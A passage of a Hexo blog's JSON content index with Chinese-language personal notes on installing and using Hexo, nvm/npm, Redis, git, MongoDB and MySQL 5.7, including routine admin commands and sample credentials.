bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">$ hexo generate<br></code></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/generating.html\">Generating</a></p>\n<h3 id=\"推送远程站点发布\"><a href=\"#推送远程站点发布\" class=\"headerlink\" title=\"推送远程站点发布\"></a>推送远程站点发布</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">$ hexo deploy<br></code></pre></td></tr></table></figure>\n\n<p>More info: <a href=\"https://hexo.io/docs/one-command-deployment.html\">Deployment</a></p>\n<h3 id=\"MarkDown-语法\"><a href=\"#MarkDown-语法\" class=\"headerlink\" title=\"MarkDown 语法\"></a>MarkDown 语法</h3><p> <a href=\"https://daringfireball.net/projects/markdown/\">markdown</a></p>\n<h3 id=\"Hexo-主题\"><a href=\"#Hexo-主题\" class=\"headerlink\" title=\"Hexo 主题\"></a>Hexo 主题</h3><p> <a href=\"https://hexo.io/themes/\">Hexo主题</a></p>\n"},{"title":"node&&npm&&nvm安装","url":"/2020/08/08/node-npm-nvm%E5%AE%89%E8%A3%85/","content":"<h2 id=\"vue概念\"><a href=\"#vue概念\" class=\"headerlink\" title=\"vue概念\"></a>vue概念</h2><pre><code>MVVM:将业务逻辑代码与视图代码完全分离，各司其职，方便维护，降低维护成本\nmodel:数据存储\nview:页面展示\nview model:业务逻辑处理，比如ajax请求,对数据加工后交给视图展示\nv-text：解决插值表达式闪烁的问题\n</code></pre>\n<h2 id=\"webpack\"><a href=\"#webpack\" class=\"headerlink\" title=\"webpack\"></a>webpack</h2><pre><code>1.导出方法\n2.导入\n3.打包\n4.html引用\n</code></pre>\n<h2 id=\"为什么使用nvm\"><a href=\"#为什么使用nvm\" class=\"headerlink\" title=\"为什么使用nvm\"></a>为什么使用nvm</h2><pre><code>我们一般安装的是最新版本的node,但是有时候，我们又需要使用低版本的node,在不借助第三方工具的情况下，\n我们只能卸载现有版本,安装需要的版本，这样显然很麻烦，今天就来介绍一个windows系统使用的node多版本管理工具nvm，\n全称是node.js version management,可以在多个node版本之间自由切换！\n</code></pre>\n<p>   下载:<a href=\"https://github.com/coreybutler/nvm-windows/releases\">nvm</a></p>\n<h2 id=\"安装nvm\"><a href=\"#安装nvm\" class=\"headerlink\" title=\"安装nvm\"></a>安装nvm</h2><pre><code>解压.zip压缩包，双击nvm-setup.exe开始安装，下面两个步骤需要注意：\n注意：安装之前必须完全卸载已安装的node\n安装完成后，在CMD命令窗口输入nvm -v,输出如下版本号即证明安装成功\n</code></pre>\n<h2 id=\"安装node\"><a href=\"#安装node\" class=\"headerlink\" title=\"安装node\"></a>安装node</h2><pre><code>查看nvm支持安装的node版本：nvm list available,使用nvm install 版本号安装指定版本node:nvm install 12.18.3\n检测node和npm是否安装成功,如下显示则为成功：node -v,npm -v\n\n初次使用nvm安装node之后，必须先使用nvm use 版本号切换到已安装版本的node才可以:nvm use 12.18.3\n\n多版本node切换:\n查看当前安装的所有node版本:nvm list,*号符表示的是当前使用的版本\n切换不同版本的node:nvm use 版本号\n</code></pre>\n<h2 id=\"常用指令\"><a href=\"#常用指令\" class=\"headerlink\" title=\"常用指令\"></a>常用指令</h2><pre><code>nvm off                     //禁用node.js版本管理(不卸载任何东西)\nnvm on                      //启用node.js版本管理\nnvm install &lt;version&gt;       //安装指定版本node,例如nvm install 12.18.3\nnvm uninstall &lt;version&gt;     //卸载指定版本node,例如nvm uninstall 12.18.3 \nnvm list                    //显示所有安装的node.js版本\nnvm list available          //显示可以安装的所有node.js的版本(windows系统)\nnvm use &lt;version&gt;           //切换到使用指定的nodejs版本，例如nvm use 12.18.3\n</code></pre>\n<h2 id=\"项目环境问题解决\"><a href=\"#项目环境问题解决\" class=\"headerlink\" title=\"项目环境问题解决\"></a>项目环境问题解决</h2><pre><code>切换版本之后，node_module文件正常情况需要重新构建，所以需要进入项目文件夹执行npm install；\n\n重新安装npm install 以后，执行npm run dev 启动项目，正常即可启动成功。\n有时会遇到有些npm包报错，需要重新rebuild一下，\n错误提示: Node Sass does not yet support your current environment:\nnpm rebuild node-sass 即可解决问题。\n</code></pre>\n<h2 id=\"nodejs命令\"><a href=\"#nodejs命令\" class=\"headerlink\" title=\"nodejs命令\"></a>nodejs命令</h2><pre><code>查看全局安装路径: npm root -g\n查看npm的基础设置: npm config ls\n查看安装目录路径: npm config get prefix\n切换npm源为淘宝源: npm config set registry https://registry.npm.taobao.org\n查看npm源: npm config get registry\ncnpm可以替代npm使用，安装cnpm:npm install -g cnpm --registry=https://registry.npm.taobao.org\n</code></pre>\n<h2 id=\"npm和cnpm混用的坑\"><a href=\"#npm和cnpm混用的坑\" class=\"headerlink\" title=\"npm和cnpm混用的坑\"></a>npm和cnpm混用的坑</h2><pre><code>因为cnpm默认使用的是软链接，会导致npm安装后，更新了之前的cnpm包，然后之前的cnpm引入就会gg了，于是，gg了一大堆东西。\n那么我们可以发现，原因在于cnpm本身，如果我们不用它问题就解决了\n那么最简单的办法就是使用npm install &lt;一些参数&gt; --registry=https://registry.npm.taobao.org\n这样就很完美了，但是这样又很麻烦\n这时候可以升级下，用nrm\n</code></pre>\n<h2 id=\"安装nrm\"><a href=\"#安装nrm\" class=\"headerlink\" title=\"安装nrm\"></a>安装nrm</h2><pre><code>npm install -g nrm\n显示使用的源地址:  nrm ls\n切换源,使用npm下载包的时候，使用cnpm的镜像源下载东西:nrm use cnpm\n\n了解每个源下载的速度:nrm test\n如果已经项目用了cnpm怎么办？\n方式改进: cnpm i --by=npm\n</code></pre>\n<h2 id=\"全局安装webpack指定版本\"><a href=\"#全局安装webpack指定版本\" class=\"headerlink\" title=\"全局安装webpack指定版本\"></a>全局安装webpack指定版本</h2><pre><code>npm install webpack@3.6.0 -g\n</code></pre>\n","categories":["nodejs"],"tags":["前端"]},{"title":"redis技术栈(一)","url":"/2020/12/17/redis%E6%8A%80%E6%9C%AF%E6%A0%88-%E4%B8%80/","content":"<h2 id=\"认识redis\"><a href=\"#认识redis\" class=\"headerlink\" title=\"认识redis\"></a>认识redis</h2><pre><code>Redis 是一种开源（BSD 许可）、内存中数据结构存储，用作数据库、缓存和消息代理。 \nRedis 提供了数据结构，例如字符串、散列、列表、集合、\n带有范围查询的排序集合(sorted sets with range queries)、\n位图、超级日志、地理空间索引(geospatial indexes)和流。\nRedis (built-in replication)内置复制、Lua 脚本、\nLRU 驱逐(LRU eviction)、事务(transactions)\n和不同级别的磁盘持久化，\n并通过 Redis Sentinel 和 \nRedis Cluster 自动分区(automatic partitioning)提供高可用性。\n官网地址:redis.io\n特点:开源(BSD licensed),使用内存数据结构存储\n用途:数据库,缓存,消息代理(message broker)\n</code></pre>\n<h2 id=\"下载安装\"><a href=\"#下载安装\" class=\"headerlink\" title=\"下载安装\"></a>下载安装</h2><pre><code>旧版本地址https://download.redis.io/releases/\n</code></pre>\n<h2 id=\"键值存储\"><a href=\"#键值存储\" class=\"headerlink\" title=\"键值存储\"></a>键值存储</h2><pre><code>键值存储的本质是能够在键内存储一些称为值的数据。\n只有当我们知道用于存储它的确切密钥时，才能稍后检索这些数据。 \nRedis 通常将它称为数据结构服务器，因为它具有外部键值外壳，\n但是每个值都可以包含复杂的数据结构，例如字符串、列表、散列\n或称为排序集以及概率的有序数据结构 像 hyperloglog 这样的数据结构。\n</code></pre>\n<h2 id=\"命令展示\"><a href=\"#命令展示\" class=\"headerlink\" title=\"命令展示\"></a>命令展示</h2><pre><code>Redis 提供的其他基本操作是 DEL 删除给定的键和关联的值，\nINCR 以原子方式递增存储在给定键上的数字：\nDECR 以原子方式递减存储在给定键上的数字：\n当您使用递增和递减命令操作 Redis 字符串时，您正在实现计数器。\n计数器是 Redis 非常流行的应用程序。\n\n单个命令实现的所有Redis操作都是原子的，包括对更复杂数据结构的操作。 \n因此，当您使用修改某些值的 Redis 命令时，您不必考虑并发访问。\n\nRedis 可以被告知一个键应该只存在一定的时间长度。 \n这是通过 EXPIRE 和 TTL 命令以及类似的 PEXPIRE 和 PTTL 命令来实现的，\n这些命令使用时间以毫秒而不是秒为单位进行操作。\neg: SET resource:lock &quot;Redis Demo&quot;\n    EXPIRE resource:lock 120\n</code></pre>\n","categories":["缓存"],"tags":["redis"]},{"title":"git 使用","url":"/2019/03/10/git-%E4%BD%BF%E7%94%A8/","content":"<h2 id=\"管理分支\"><a href=\"#管理分支\" class=\"headerlink\" title=\"管理分支\"></a>管理分支</h2><pre><code>1、查看分支\n    $ git branch\n    * master\n    *标识的是你当前所在的分支。\n2.查看远程分支\n    git branch -r\n3、查看所有分支\n    git branch -a\n</code></pre>\n<h2 id=\"本地创建新的分支\"><a href=\"#本地创建新的分支\" class=\"headerlink\" title=\"本地创建新的分支\"></a>本地创建新的分支</h2><pre><code>git branch [branch name]\n</code></pre>\n<h2 id=\"切换到新的分支\"><a href=\"#切换到新的分支\" class=\"headerlink\" title=\"切换到新的分支\"></a>切换到新的分支</h2><pre><code>git checkout [branch name]\n</code></pre>\n<h2 id=\"创建-切换分支\"><a href=\"#创建-切换分支\" class=\"headerlink\" title=\"创建+切换分支\"></a>创建+切换分支</h2><pre><code>git checkout -b [branch name]\n相当于以下两步操作：\ngit branch [branch name]\ngit checkout [branch name]\n</code></pre>\n<h2 id=\"将新分支推送到github\"><a href=\"#将新分支推送到github\" class=\"headerlink\" title=\"将新分支推送到github\"></a>将新分支推送到github</h2><pre><code>git push origin [branch name]\n</code></pre>\n<h2 id=\"删除本地分支\"><a href=\"#删除本地分支\" class=\"headerlink\" title=\"删除本地分支\"></a>删除本地分支</h2><pre><code>git branch -d [branch name]\n</code></pre>\n<h2 id=\"删除github远程分支\"><a href=\"#删除github远程分支\" class=\"headerlink\" title=\"删除github远程分支\"></a>删除github远程分支</h2><pre><code>git push origin :[branch name]\n分支名前的冒号代表删除。\n</code></pre>\n","categories":["version_control"],"tags":["git"]},{"title":"使用hexo搭建githubpage博客","url":"/2018/02/02/%E4%BD%BF%E7%94%A8hexo%E6%90%AD%E5%BB%BAgithubpage%E5%8D%9A%E5%AE%A2/","content":"<h2 id=\"为什么要搞博客？\"><a href=\"#为什么要搞博客？\" class=\"headerlink\" title=\"为什么要搞博客？\"></a>为什么要搞博客？</h2><pre><code>   互联网技术日新月异，如何快速又高效的提高我们的技术水平是每一个程序员都要面临的问题，像我，一天工作8-10小时，\n上下班路上还要花费3到4个小时，除却这些时间，每天留给自己学习的时间不过两三个小时。大家都知道，现在行内内卷严重，\n无论是出于家庭原因还是个人职业的发展，充分利用这有效的一点时间来提升自己的技术水平是十分重要的，虽然现在学习一门技术\n有很多手段，比如看b站视频，某宝买点资源，或者是工资内部学习资料等等，各种方式大大降低了我们学习的困难程度，但是人类的脑子\n是健忘的，所谓好记性不如烂笔头，将学习成果通过博客的方式来输出，我觉得是非常有利于我们自己的一件事。\n好处呢，大概有以下几点：\n    1.加深印象。这点很有体会，某个技术点学起来没什么难度，但是你又不经常用，过了一段时间，忘了，再想拿起来，还得四处\n找资料，总结，重复成本很高。\n    2.方便查找。同样，将学习成果按照自己的习惯分类，当你需要用的时候，很容易查找，很方便.\n    3.培养总结的习惯。很好的培养自己思考和总结的能力，说不定哪天还能创造点东西，哈哈。\n    4.交流进步。众人拾柴火焰高，一人一个想法，一千个人交流，每个人将会有一千个想法，棒棒哒.\n</code></pre>\n<h2 id=\"什么是hexo\"><a href=\"#什么是hexo\" class=\"headerlink\" title=\"什么是hexo?\"></a>什么是hexo?</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><code class=\"hljs bash\">[Hexo](https://hexo.io/zh-cn/)是一个快速、简洁且高效的博客框架。<br>Hexo使用Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。<br>当我们在遇到一个新东西的时候，进入其官网能帮助我们解决很多问题。关于什么是Hexo？<br>还有一些关于Hexo的问题，可以进入Hexo官网进行查看，相信你会收益良多.<br></code></pre></td></tr></table></figure>\n<h2 id=\"使用hexo搭建博客\"><a href=\"#使用hexo搭建博客\" class=\"headerlink\" title=\"使用hexo搭建博客\"></a>使用hexo搭建博客</h2><pre><code>   安装Hexo相当简单。然而在安装前，您必须检查电脑中是否已安装下列应用程序：\n   Node.js\n   Git\n   npm/cnpm 如果npm运行出错就安装cnpm国内镜像\n   如果没有上面三个必须的环境，那就需要逐个安装了，网上很多方法可以安装，自行google\n   ### 安装Hexo\n   打开Git Bash Here输入:\n   npm install -g hexo-cli/cnpm install -g hexo-cli\n   检查是否安装Hexo完成,查询是否成功:\n   hexo -V\n</code></pre>\n<h2 id=\"搭建博客\"><a href=\"#搭建博客\" class=\"headerlink\" title=\"搭建博客\"></a>搭建博客</h2><pre><code>   个人机器创建存储博客的文件夹或者目录\n   执行：\n   hexo init \\&lt;folder&gt;\n   cd \\&lt;folder&gt;\n   npm/cnpm install\n   说明：\\&lt;folder&gt;是博客项目所在目录\n   eg: \n   1.hexo init myblog\n   2.cd myblog\n   3.npm/cnpm install\n   以上执行完毕，就有了一个简单的博客，访问：localhost:4000查看\n</code></pre>\n<h2 id=\"上传github发布\"><a href=\"#上传github发布\" class=\"headerlink\" title=\"上传github发布\"></a>上传github发布</h2><pre><code>   1.在github上创建后缀名为github.io的repository\n   eg: username.github.io\n   2.修改博客目录下的_config.yml文件:\n   deploy:\n     type: git\n     repository: https://github.com/username/username.github.io.git #复制过来,username按照你自己自定义替换\n     branch: master\n   url: http://username.github.io\n   3.部署\n    3.1 部署之前在博客目录路径gitbash执行:npm/cnpm install hexo-deployer-git --save\n    3.2 每次提交时必须执行这三个命令:\n        hexo clean\n        hexo generate\n        hexo deploy\n        或者简写方式\n        hexo clean\n        hexo g\n        hexo d\n    3.3 启动博客查看\n        hexo s  ,访问localhost:4000查看\n</code></pre>\n<h2 id=\"Hexo-项目目录结构说明\"><a href=\"#Hexo-项目目录结构说明\" class=\"headerlink\" title=\"Hexo 项目目录结构说明\"></a>Hexo 项目目录结构说明</h2><pre><code>   deploy：执行hexo deploy命令部署到GitHub上的内容目录\n   public：执行hexo generate命令，输出的静态网页内容目录\n   scaffolds：layout模板文件目录，其中的md文件可以添加编辑\n   scripts：扩展脚本目录，这里可以自定义一些javascript脚本\n   source：文章源码目录，该目录下的markdown和html文件均会被hexo处理。该页面对应repo的根目录，404文件、favicon.ico文件，CNAME文件等都应该放这里，该目录下可新建页面目录。\n        drafts：草稿文章\n        posts：发布文章\n   themes：主题文件目录\n   _config.yml：全局配置文件，大多数的设置都在这里\n   package.json：应用程序数据，指明hexo的版本等信息，类似于一般软件中的关于按钮\n</code></pre>\n","categories":["hexo"],"tags":["hexo"]},{"title":"mongodb 安装与使用入门","url":"/2019/01/04/mongodb-%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/","content":"<h2 id=\"下载安装文件\"><a href=\"#下载安装文件\" class=\"headerlink\" title=\"下载安装文件\"></a>下载安装文件</h2><pre><code>wget ftp://192.168.205.11/Third_party/linux/mongodb-linux-x86_64-rhel62-3.4.2.gz\n</code></pre>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><h3 id=\"1-解压安装文件\"><a href=\"#1-解压安装文件\" class=\"headerlink\" title=\"(1).解压安装文件\"></a>(1).解压安装文件</h3><pre><code>tar -xzvf mongodb-linux-x86_64-rhel62-3.4.2.gz -C /usr/local/eversec/\ncd /usr/local/eversec/\nmv mongodb-linux-x86_64-rhel62-3.4.2 mongodb\ncd /usr/local/eversec/mongodb\ncp bin/* /usr/local/bin\n</code></pre>\n<h3 id=\"2-创建目录\"><a href=\"#2-创建目录\" class=\"headerlink\" title=\"(2).创建目录\"></a>(2).创建目录</h3><pre><code> 创建数据存放目录，例如：mkdir -p /home/mongodb/data\n 创建日志存放目录，例如：mkdir -p /home/mongodb/logs\n 创建pidfile文件路径，例如：mkdir /var/run/mongodb\n 创建conf存放目录，例如：mkdir /usr/local/eversec/mongodb/conf\n</code></pre>\n<h3 id=\"3-修改配置文件\"><a href=\"#3-修改配置文件\" class=\"headerlink\" title=\"(3).修改配置文件\"></a>(3).修改配置文件</h3><pre><code>添加如下内容到 vi /usr/local/eversec/mongodb/conf/mongodb.conf\n# mongod.conf\n\n# for documentation of all options, see:\n#   http://docs.mongodb.org/manual/reference/configuration-options/\n\n# where to write logging data.\nsystemLog:\n  destination: file\n  logAppend: true\n  path: /home/mongodb/logs/mongodb.log\n\n# Where and how to store data.\nstorage:\n  dbPath: /home/mongodb/data/\n  journal:\n    enabled: true\n#  engine:\n#  mmapv1:\n#  wiredTiger:\n\n# how the process runs\nprocessManagement:\n  fork: true  # fork and run in background\n  pidFilePath: /var/run/mongodb/mongod.pid \n# location of pidfile\n\n# network interfaces\nnet:\n  port: 27017\n  bindIp: 127.0.0.1\n# eg: 127.0.0.1,192.168.200.221 Listen to local interface only, comment to listen on all interfaces.\n\n#security:\n\n#operationProfiling:\n\n#replication:\n\n#sharding:\n\n## Enterprise-Only Options\n\n#auditLog:\n\n#snmp:\n注：\n修改日志文件路径，例：systemLog下的path\n修改数据文件路径，例：storage下的dbPath\n远程访问时，绑定具体IP。例：bindIp:127.0.0.1,192.168.50.228(根据服务器ip填写)\n</code></pre>\n<h2 id=\"无认证启动\"><a href=\"#无认证启动\" class=\"headerlink\" title=\"无认证启动\"></a>无认证启动</h2><pre><code>mongod --config /usr/local/mongodb/conf/mongodb.conf  --dbpath /home/mongodb/data \n</code></pre>\n<h2 id=\"客户端连接\"><a href=\"#客户端连接\" class=\"headerlink\" title=\"客户端连接\"></a>客户端连接</h2><pre><code>./mongo\n关闭：\nuse admin;\ndb.shutdownServer();\n</code></pre>\n<h2 id=\"设置验证用户启动\"><a href=\"#设置验证用户启动\" class=\"headerlink\" title=\"设置验证用户启动\"></a>设置验证用户启动</h2><pre><code>设置用户见下方：无认证启动，添加用户后，配置，认证启动\nsecurity:\nLinux：authorization: enabled\nwindows:mongodb.conf 配置 auth=true;\nmongod --config /usr/local/mongodb/conf/mongodb.conf  --dbpath /home/mongodb/data --auth\n</code></pre>\n<h2 id=\"客户端连接-1\"><a href=\"#客户端连接-1\" class=\"headerlink\" title=\"客户端连接\"></a>客户端连接</h2><pre><code>./mongo -uroot -p123456 --authenticationDatabase admin\n</code></pre>\n<h2 id=\"查看端口占用\"><a href=\"#查看端口占用\" class=\"headerlink\" title=\"查看端口占用\"></a>查看端口占用</h2><pre><code>netstat -lanp | grep &quot;27017&quot;\n</code></pre>\n<h2 id=\"mongodb设置开机启动\"><a href=\"#mongodb设置开机启动\" class=\"headerlink\" title=\"mongodb设置开机启动:\"></a>mongodb设置开机启动:</h2><pre><code>vim  /etc/rc.local\nmongod --dbpath=/usr/local/mongodb/data --logpath=/usr/local/mongodb/logs/mongodb.log --logappend --fork\n</code></pre>\n<h2 id=\"关闭mongodb\"><a href=\"#关闭mongodb\" class=\"headerlink\" title=\"关闭mongodb\"></a>关闭mongodb</h2><pre><code>use admin;\ndb.shutdownServer();\n</code></pre>\n<h2 id=\"相关操作\"><a href=\"#相关操作\" class=\"headerlink\" title=\"相关操作\"></a>相关操作</h2><h3 id=\"创建数据库：\"><a href=\"#创建数据库：\" class=\"headerlink\" title=\"创建数据库：\"></a>创建数据库：</h3><pre><code>use database;\neg: use test;\n</code></pre>\n<p>   ###查看数据库下有那些集合：<br>    show collections;</p>\n<h3 id=\"删除数据库\"><a href=\"#删除数据库\" class=\"headerlink\" title=\"删除数据库\"></a>删除数据库</h3><pre><code>db.dropDatabase();\n注意：database下在有collection时才会显示\n</code></pre>\n<h3 id=\"查看数据库列表\"><a href=\"#查看数据库列表\" class=\"headerlink\" title=\"查看数据库列表\"></a>查看数据库列表</h3><pre><code>show dbs;\n</code></pre>\n<h3 id=\"创建集合\"><a href=\"#创建集合\" class=\"headerlink\" title=\"创建集合\"></a>创建集合</h3><pre><code>db.createCollection(&quot;namme&quot;,[options]); \neg: db.createCollection(&quot;student&quot;);\nname必须要有，options可以省略\n</code></pre>\n<h3 id=\"删除集合\"><a href=\"#删除集合\" class=\"headerlink\" title=\"删除集合\"></a>删除集合</h3><pre><code>db.collection.drop(); eg:db.student.drop();\n</code></pre>\n<h3 id=\"插入命令\"><a href=\"#插入命令\" class=\"headerlink\" title=\"插入命令\"></a>插入命令</h3><pre><code>db.collection.insert(document);\ndocument:json格式\neg: \ndb.student.insert(&#123;&quot;name&quot;:&quot;张三&quot;,&quot;age&quot;:24&#125;);\n</code></pre>\n<h3 id=\"更新\"><a href=\"#更新\" class=\"headerlink\" title=\"更新\"></a>更新</h3><pre><code>db.collection.update(&#123;*&#125;,&#123;*&#125;);\neg:\ndb.student.update(&#123;&quot;name&quot;:&quot;zhangsan&quot;&#125;,&#123;&quot;name&quot;:&quot;李四&quot;,&quot;age&quot;:20&#125;)\n</code></pre>\n<h3 id=\"更新2\"><a href=\"#更新2\" class=\"headerlink\" title=\"更新2\"></a>更新2</h3><pre><code>db.student.update(&#123;&quot;name&quot;:&quot;zhangsan&quot;&#125;,&#123;$set:&#123;&quot;name&quot;:&quot;李四&quot;,&quot;age&quot;:40&#125;&#125;,&#123;multi:true&#125;);\n$set：修改器相比直接update,直接update:先删除，在插入,$set:做到了真正的更新，可以对指定字段进行更新\nmulti: false表示只修改第一个匹配的文档，true：表示更新所有匹配的文档\n</code></pre>\n<h3 id=\"删除\"><a href=\"#删除\" class=\"headerlink\" title=\"删除\"></a>删除</h3><pre><code>db.student.remove(); // 全部删除\ndb.student.remove(&#123;&quot;name&quot;:&quot;张三&quot;&#125;);// 匹配删除\n</code></pre>\n<h3 id=\"查询\"><a href=\"#查询\" class=\"headerlink\" title=\"查询\"></a>查询</h3><pre><code>db.student.find();//查询全部\ndb.student.find(&#123;&quot;name&quot;:&quot;张三&quot;&#125;);//匹配查询\ndb.student.find(&#123;&quot;name&quot;:&quot;张三&quot;&#125;,&#123;name:1,age:1,_id:0&#125;);//匹配查询,过滤域显示\n</code></pre>\n<h3 id=\"用户创建\"><a href=\"#用户创建\" class=\"headerlink\" title=\"用户创建\"></a>用户创建</h3><pre><code>用户创建是和数据库对应的，admin数据库\neg:\nuse admin;\ndb.createUser(\n        &#123;\n        user:&quot;root&quot;,\n        pwd:&quot;123456&quot;,\n        roles:[&#123;role:&quot;root&quot;,db:&quot;admin&quot;&#125;]\n        &#125;\n);\n结果:\nSuccessfully added user: &#123;\n        &quot;user&quot; : &quot;root&quot;,\n        &quot;roles&quot; : [\n                &#123;\n                        &quot;role&quot; : &quot;root&quot;,\n                        &quot;db&quot; : &quot;admin&quot;\n                &#125;\n        ]\n&#125;\nuse admin;\ndb.createUser(\n    &#123;\n    user:&quot;test&quot;,\n    pwd:&quot;123456&quot;,\n    roles:[&#123;role:&quot;root&quot;,db:&quot;admin&quot;&#125;]\n    &#125;\n);\n</code></pre>\n<h3 id=\"查看用户\"><a href=\"#查看用户\" class=\"headerlink\" title=\"查看用户\"></a>查看用户</h3><pre><code>use admin;\nshow users;\n</code></pre>\n<h3 id=\"删除用户\"><a href=\"#删除用户\" class=\"headerlink\" title=\"删除用户\"></a>删除用户</h3><pre><code>db.dropUser(&quot;test&quot;);\n</code></pre>\n<h3 id=\"修改用户角色\"><a href=\"#修改用户角色\" class=\"headerlink\" title=\"修改用户角色\"></a>修改用户角色</h3><pre><code>db.updateUser(&quot;test&quot;,&#123;roles:[&#123;role:&quot;readWriteAnyDatabase&quot;,db:&quot;admin&quot;&#125;]&#125;);\n结果：\n&#123;\n        &quot;_id&quot; : &quot;admin.test&quot;,\n        &quot;user&quot; : &quot;test&quot;,\n        &quot;db&quot; : &quot;admin&quot;,\n        &quot;roles&quot; : [\n                &#123;\n                        &quot;role&quot; : &quot;readWriteAnyDatabase&quot;,\n                        &quot;db&quot; : &quot;admin&quot;\n                &#125;\n        ]\n&#125;\n</code></pre>\n<h3 id=\"修改用户密码\"><a href=\"#修改用户密码\" class=\"headerlink\" title=\"修改用户密码:\"></a>修改用户密码:</h3><pre><code>db.changeUserPassword(&quot;test&quot;,&quot;newPass&quot;);\n然后使用新密码登录进行验证。\n</code></pre>\n","categories":["mongo"],"tags":["mongo"]},{"title":"安装mysql","url":"/2018/10/08/%E5%AE%89%E8%A3%85mysql5.7/","content":"<h2 id=\"下载mysql-5-7安装包\"><a href=\"#下载mysql-5-7安装包\" class=\"headerlink\" title=\"下载mysql-5.7安装包\"></a>下载mysql-5.7安装包</h2><pre><code>centos6下载:\nwget ftp://192.168.205.11/Third_party/linux/MySQL-5.7.23.zip\n</code></pre>\n   <img src=\"/images/mysql5.7/getMysql.png\" width=\"1000px\" height=\"300px\" alt=\"下载mysql-5.7安装包\">\n   \n<h2 id=\"解压安装文件\"><a href=\"#解压安装文件\" class=\"headerlink\" title=\"解压安装文件\"></a>解压安装文件</h2><pre><code>unzip MySQL-5.7.23.zip\n</code></pre>\n<h2 id=\"查看是否已安装mysql\"><a href=\"#查看是否已安装mysql\" class=\"headerlink\" title=\"查看是否已安装mysql\"></a>查看是否已安装mysql</h2><pre><code>rpm -qa | grep -i mysql\n</code></pre>\n<h2 id=\"如已经安装则停止mysql进程\"><a href=\"#如已经安装则停止mysql进程\" class=\"headerlink\" title=\"如已经安装则停止mysql进程\"></a>如已经安装则停止mysql进程</h2><pre><code>service mysqld stop\n</code></pre>\n<h2 id=\"卸载历史安装\"><a href=\"#卸载历史安装\" class=\"headerlink\" title=\"卸载历史安装\"></a>卸载历史安装</h2><pre><code>rpm -e  + 已安装\n</code></pre>\n<h2 id=\"安装5-7版本\"><a href=\"#安装5-7版本\" class=\"headerlink\" title=\"安装5.7版本\"></a>安装5.7版本</h2><pre><code>rpm -ivh mysql-community-common-5.7.23-1.el6.x86_64.rpm       \nrpm -ivh mysql-community-libs-5.7.23-1.el6.x86_64.rpm\nrpm -ivh mysql-community-client-5.7.23-1.el6.x86_64.rpm\nrpm -ivh mysql-community-server-5.7.23-1.el6.x86_64.rpm \nrpm -ivh mysql-community-devel-5.7.23-1.el6.x86_64.rpm\n注: base9.2时需安装numactl-2.0.9-2.el6.i686.rpm\n</code></pre>\n<h3 id=\"报错1\"><a href=\"#报错1\" class=\"headerlink\" title=\"报错1\"></a>报错1</h3><pre><code>1. mysql-community-common(x86-64) &gt;= 5.7.9 is needed by mysql-community-libs-5.7.23-1.el6.x86_64 \n</code></pre>\n<h4 id=\"解决办法\"><a href=\"#解决办法\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h4><pre><code>清除yum里所有mysql依赖包\nrpm -qa|grep mysql\nyum remove mysql-libs\n</code></pre>\n<h3 id=\"报错2\"><a href=\"#报错2\" class=\"headerlink\" title=\"报错2\"></a>报错2</h3><pre><code>   error: Failed dependencies:\n   libaio.so.1()(64bit) is needed by mysql-community-server-5.7.23-1.el6.x86_64\n   libaio.so.1(LIBAIO_0.1)(64bit) is needed by mysql-community-server-5.7.23-1.el6.x86_64\n   libaio.so.1(LIBAIO_0.4)(64bit) is needed by mysql-community-server-5.7.23-1.el6.x86_64\n   libsasl2.so.2()(64bit) is needed by mysql-community-server-5.7.23-1.el6.x86_64\n</code></pre>\n<h4 id=\"解决办法-1\"><a href=\"#解决办法-1\" class=\"headerlink\" title=\"解决办法\"></a>解决办法</h4><pre><code>yum install libaio\n</code></pre>\n<h3 id=\"再报错\"><a href=\"#再报错\" class=\"headerlink\" title=\"再报错\"></a>再报错</h3><pre><code>error: Failed dependencies:\n    libsasl2.so.2()(64bit) is needed by mysql-community-server-5.7.23-1.el6.x86_64\n</code></pre>\n<h2 id=\"修改数据表存储路径为-home-mysql-data\"><a href=\"#修改数据表存储路径为-home-mysql-data\" class=\"headerlink\" title=\"修改数据表存储路径为/home/mysql/data\"></a>修改数据表存储路径为/home/mysql/data</h2><pre><code>a.清除/home/mysql/data目录下文件\n  rm -rf /home/mysql/data/*\nb.修改/etc/my.cnf配置文件\n  vi /etc/my.cnf\n  datadir=/var/lib/mysql修改为datadir=/home/mysql/data\n  socket=/var/lib/mysql/mysql.sock修改为socket=/home/mysql/data/mysql.sock\n  按Esc键，输入:wq，按回车键保存退出\nc.创建mysql.sock软链\n  ln -s /home/mysql/data/mysql.sock /var/lib/mysql/mysql.sock\n</code></pre>\n<h2 id=\"启动mysql\"><a href=\"#启动mysql\" class=\"headerlink\" title=\"启动mysql\"></a>启动mysql</h2><pre><code>service mysqld start\n</code></pre>\n<h2 id=\"无密登陆设置密码\"><a href=\"#无密登陆设置密码\" class=\"headerlink\" title=\"无密登陆设置密码\"></a>无密登陆设置密码</h2><pre><code>mysqld_safe --skip-grant-tables\n</code></pre>\n<h3 id=\"为了安全可以这样禁止远程连接：\"><a href=\"#为了安全可以这样禁止远程连接：\" class=\"headerlink\" title=\"为了安全可以这样禁止远程连接：\"></a>为了安全可以这样禁止远程连接：</h3><pre><code>mysqld_safe--skip-grant-tables--skip-networking\n现在可以无密登录\nmysql -uroot -p 两次回车即可登录\n</code></pre>\n<h3 id=\"无密登录后设置新密码\"><a href=\"#无密登录后设置新密码\" class=\"headerlink\" title=\"无密登录后设置新密码\"></a>无密登录后设置新密码</h3><pre><code>use mysql;\nupdate  mysql.user  set  authentication_string=password(&quot;新密码&quot;) where  user=&quot;root&quot;  and host=&quot;localhost&quot;;\n密码等级默认MEDIUM,所以不能设置简单密码\nupdate  mysql.user  set  authentication_string=password(&quot;QHDcm@1991&quot;) where  user=&quot;root&quot;  and host=&quot;localhost&quot;;\nupdate  mysql.user  set  password_expired=password(&quot;新密码&quot;) where  user=&quot;root&quot;  and host=&quot;localhost&quot;;\nflush  privileges;  //更新\nquit;\n说明：select password(&quot;123456&quot;):password(*):函数加密\n退出后使用新密码登录\nmysql -u root -p 